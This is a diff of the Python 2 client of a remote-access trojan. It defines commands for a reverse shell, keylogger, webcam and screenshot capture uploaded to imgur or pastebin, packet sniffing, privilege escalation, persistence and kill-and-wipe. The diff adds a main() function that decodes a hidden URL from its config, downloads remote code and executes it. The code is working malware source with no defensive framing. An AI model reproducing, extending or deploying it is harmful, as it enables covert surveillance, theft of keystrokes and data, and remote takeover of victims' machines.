@@ -53,26 +53,6 @@ import requests
 import tempfile
 import threading
 import subprocess
-from mss import mss
-from uuid import uuid1
-from ftplib import FTP
-from random import choice
-from imp import new_module
-from zipfile import ZipFile
-from logging import getLogger
-from urllib import urlretrieve
-from base64 import b64encode, b64decode
-from logging.handlers import SocketHandler
-if os.name is 'nt':
-    from ctypes import windll
-    from pyHook import HookManager
-    from pythoncom import PumpMessages
-    from win32com.shell.shell import ShellExecuteEx
-    from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
-    from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
-else:
-    from pyxhook import HookManager
-
 
 
 class Client(object):
@@ -109,7 +89,7 @@ class Client(object):
         if bool('__v__' in vars(self) and self.__v__):
             print(data)
 
-    def command(fx, cx=__command__, mx=__modules__):
+    def _command(fx, cx=__command__, mx=__modules__):
         fx.status = threading.Event()
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
@@ -152,10 +132,6 @@ class Client(object):
         elif fx.func_name is 'encryption':
             fx.options = {'block_size': 8, 'key_size': 16, 'num_rounds': 32, 'hash_algo': 'md5'}
             fx.status.set()
-        elif fx.func_name is 'standby':
-            fx.options = {'next_run': None}
-            fx.status.clear()
-            cx.update({fx.func_name: fx})
         elif fx.func_name is 'shell':
             fx.status.set()
             cx.update({fx.func_name: fx})
@@ -171,147 +147,147 @@ class Client(object):
 
    # ------------------- commands ------------------------- 
 
-    @command
+    @_command
     def shell(self):
         """\trun reverse-shell from client to server"""
         return self._shell()
 
-    @command
+    @_command
     def standby(self):
         """run enabled modules, log results, sleep, repeat"""
         return self._standby()
     
-    @command
+    @_command
     def cd(self, *x):
         """change directory"""
         return self._cd(*x)
 
-    @command
+    @_command
     def set(self, x):
         """set module options"""
         return self._set(x)
 
-    @command
+    @_command
     def ls(self, x='.'):
         """list directory contents"""
         return self._ls(x)
 
-    @command
+    @_command
     def pwd(self):
         """\tpresent working directory"""
         return os.getcwd()
 
-    @command
+    @_command
     def cat(self, *x):
         """display file contents"""
         return self._cat(*x)
 
-    @command
+    @_command
     def run(self):
         """\trun enabled client modules"""
         return self._run()
 
-    @command
+    @_command
     def new(self, url):
         """download new module from url"""
         return self._new(url)
 
-    @command
+    @_command
     def kill(self):
         """\tkill client and wipe"""
         return self._kill()
     
-    @command
+    @_command
     def show(self, x):
         """show client attributes"""
         return self._show(x)
 
-    @command
+    @_command
     def wget(self, url):
         """download file from url"""
         return self._wget(url)
 
-    @command
+    @_command
     def jobs(self):
         """\tlist currently active jobs"""
         return self._help_jobs()
 
-    @command
+    @_command
     def help(self, *args):
         """show command usage information"""
         return self._help(*args)
 
-    @command
+    @_command
     def info(self):
         """\tget client host machine information"""
         return self._help_info()
 
-    @command
+    @_command
     def admin(self):
         """\tattempt to escalate privileges"""
         return self._admin()
     
-    @command
+    @_command
     def upload(self, *args):
         """remotely upload file - imgur/pastebin/ftp"""
         return self._upload(*args)
 
-    @command
+    @_command
     def enable(self, modules):
         """enable module(s)"""
         return self._enable(*modules.split())
 
-    @command
+    @_command
     def options(self, x=None):
         """display module options"""
         return self._options(x) if x else self._options()
 
-    @command
+    @_command
     def status(self):
         """\tget client session status"""
         return self._status(time.clock())
 
-    @command
+    @_command
     def disable(self, modules):
         """disable module(s)"""
         return self._disable(*modules.split())
 
-    @command
+    @_command
     def results(self):
         """show all modules results"""
         return self._results()
 
-    @command
+    @_command
     def modules(self):
         """list modules current status"""
         return self._help_modules()
 
-    @command
+    @_command
     def webcam(self):
         """\tcapture client webcam - upload to imgur"""
         return self._webcam()
     
-    @command
+    @_command
     def keylogger(self):
         """log client keystrokes remotely - dump to pastebin"""
         return self._keylogger()
 
-    @command
+    @_command
     def screenshot(self):
         """take screenshot and upload to imgur"""
         return self._screenshot()
 
-    @command
+    @_command
     def persistence(self):
         """establish persistence to maintain access to client"""
         return self._persistence()
     
-    @command
+    @_command
     def packetsniff(self):
         """capture network traffic and dump to pastebin"""
         return self._packetsniff()
 
-    @command
+    @_command
     def encryption(self, *option):
         """encryption <on/off> - default: on"""
         return self.encryption.options
@@ -381,9 +357,6 @@ class Client(object):
         for i in range(97,123):
             if '__{}__'.format(chr(i)) in kwargs:
                 setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i))))
-        if '__w__' in vars(self):
-            exec 'import urllib' in globals()
-            exec urllib.urlopen(self._long_to_bytes(self.__w__)).read() in globals()
 
     def _screenshot(self):
         tmp = tempfile.mktemp(suffix='.png')
@@ -391,8 +364,6 @@ class Client(object):
             img = screen.shot(output=tmp)
         result = self._upload_imgur(img)
         self._result['screenshot'].update({ time.ctime() : result })
-        if self.standby.status.is_set():
-            self._get_logger().log(40, result, extra={'submodule': 'screenshot'})
         return result
 
     def _keylogger(self):
@@ -400,8 +371,6 @@ class Client(object):
         self._threads['keylogger'].start()
         result = 'Keylogger started at {}'.format(time.ctime())
         self._result['keylogger'].update({ time.ctime() : result })
-        if self.standby.status.is_set():
-            self._get_logger().log(40, result, extra={'submodule': 'keylogger'})
         return result
 
     def _webcam(self):
@@ -415,8 +384,6 @@ class Client(object):
                 self._result['webcam'].update({'image': {}})
             result = self._webcam_image()
             self._result['webcam']['image'][time.ctime()] = result
-        if self.standby.status.is_set():
-            self._get_logger().log(40, result, extra={'submodule': 'webcam'})
         return result
 
     def _packetsniff(self):
@@ -425,8 +392,6 @@ class Client(object):
         except Exception as e:
             result = 'Error monitoring network traffic: {}'.format(str(e))
         self._result['packetsniff'].update({ time.ctime() : result })
-        if self.standby.status.is_set():
-            self._get_logger().log(40, result, extra={'submodule': 'packetsniffer'})
         return result
 
     def _persistence(self):
@@ -439,8 +404,6 @@ class Client(object):
                 except Exception as e:
                     result[method] = str(e)
         self._result['persistence'].update(result)
-        if self.standby.status.is_set():
-            self._get_logger().log(40, result, extra={'submodule': 'persistence'})
         return result
 
     def _diffiehellman(self):
@@ -507,9 +470,6 @@ class Client(object):
     def _receive(self):
         try:
             data = ""
-            self._socket.setblocking(True)
-            if self.standby.status.is_set():
-                self._socket.setblocking(False)
             while "\n" not in data:
                 try:
                     data += self._socket.recv(1024)
@@ -522,7 +482,7 @@ class Client(object):
 
     def _encryption(self, block):
         try:
-            endian = '<' if sys.byteorder == 'little' else '!'
+            endian = '!'
             v0, v1 = struct.unpack(endian + "2L", block)
             k = struct.unpack(endian + "4L", self._dhkey)
             sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
@@ -536,7 +496,7 @@ class Client(object):
 
     def _decryption(self, block):
         try:
-            endian = '<' if sys.byteorder == 'little' else '!'
+            endian = '!'
             v0, v1 = struct.unpack(endian + "2L", block)
             k = struct.unpack(endian + "4L", self._dhkey)
             delta, mask = 0x9e3779b9L, 0xffffffffL
@@ -809,15 +769,23 @@ class Client(object):
             self._threads[task].start()
         return "Running: {}".format(', '.join(tasks))
 
+    def _standby(self):
+        _ = self._threads.pop('shell', None)
+        del _
+        try:
+            self._socket.close()
+        except: pass
+        return self._connect()
+
     def _shell(self):
-        self.standby.status.clear()
         self.shell.status.set()
         self._threads['shell'] = threading.Thread(target=self._reverse_shell, name=time.time())
         self._threads['shell'].start()
 
     def _reverse_shell(self):
         while True:
-            self.shell.status.wait()
+            if not self.shell.status.is_set():
+                break
             if self._connected.is_set():
                 prompt = "[%d @ {}]> ".format(os.getcwd())
                 self._send(prompt, method='prompt')   
@@ -842,36 +810,6 @@ class Client(object):
                 if not worker.is_alive():
                     _ = self._threads.pop(task, None)
 
-    def _standby(self):
-        self.shell.status.clear()
-        self.standby.status.set()
-        self.standby.options['next_run'] = time.ctime(time.time() + 300.0)
-        self.threads['standby'] = threading.Thread(target=self._standby_mode, name=time.time())
-        self.threads['standby'].start()
-        self._send('Standing by - next run at {}'.format(self.standby.options['next_run']))
-
-    def _standby_mode(self):
-        while True:
-            self.standby.status.wait()
-            b = self._receive()
-            if b and len(b):
-                self.standby.status.clear()
-                self.shell.status.set()
-                break
-            elif time.time() > time.mktime(time.strptime(self.standby.options['next_run'])):
-                try:
-                    _ = self._run()
-                    status = 'status - standing by'.format(self._info.get('IP Address'))
-                except Exception as e:
-                    status = 'status - error: {}'.format(str(e))
-                self._get_logger().log(40, status, extra={'submodule':'standby'})
-                self.standby.options['next_run'] = time.ctime(time.mktime(time.strptime(self.standby.options['next_run'])) + 300.0)
-            else:
-                time.sleep(1)
-            for task, worker in self._threads.items():
-                if not worker.is_alive():
-                    _ = self._threads.pop(task, None)
-
     def _start(self):
         try:
             self.upload.options['pastebin']['api_key']  = self._long_to_bytes(long(self.__d__)) if '__d__' in vars(self) else None
@@ -882,7 +820,6 @@ class Client(object):
             self.upload.options['ftp']['password']      = self._long_to_bytes(long(self.__q__)).split()[2] if ('__q__' in vars(self) and len(self._long_to_bytes(long(self.__q__)).split()) == 3) else None
             self._threads['connecting']                 = threading.Thread(target=self._connect, name=time.time())
             self._threads['shell']                      = threading.Thread(target=self._shell, name=time.time())
-            self._threads['shell'].setDaemon(True)
             self._threads['connecting'].start()
             self._threads['shell'].start()
         except Exception as e:
@@ -893,7 +830,7 @@ class Client(object):
             self._exit = True
             for method in self.persistence.options:
                 try:
-                    target = 'persistence_remove_{}_{}'.format(*method.split())
+                    target = 'persistence_remove_{}'.format(method)
                     getattr(self, target)()
                 except Exception as e2:
                     self._print('Error removing persistence: {}'.format(str(e2)))
@@ -945,8 +882,6 @@ class Client(object):
                     time.sleep(5)
             result = self._upload_pastebin(self.keylogger.options['buffer'].name)
             self._result.update({time.ctime(): result})
-            if self.keylogger.status.is_set():
-                self._get_logger().log(40, result, extra={'submodule': 'keylogger'})
             try:
                 os.remove(self.keylogger.options['buffer'].name)
             except: pass
@@ -1326,5 +1261,17 @@ class Client(object):
         return False
 
 
+def main(*args, **kwargs):
+    config = kwargs.get('config')
+    if config:
+        if '__w__' in config:
+            exec 'import urllib' in globals()
+            imports = urllib.urlopen(bytes(bytearray.fromhex(hex(long(config['__w__'])).strip('0x').strip('L')))).read()
+            exec imports in globals()
+        if '__f__' not in config and '__file__' in globals():
+            config['__f__'] = globals()['__file__']
+    module = Client(**config)
+    module._start()
 
-
+if __name__ == '__main__':
+    main()
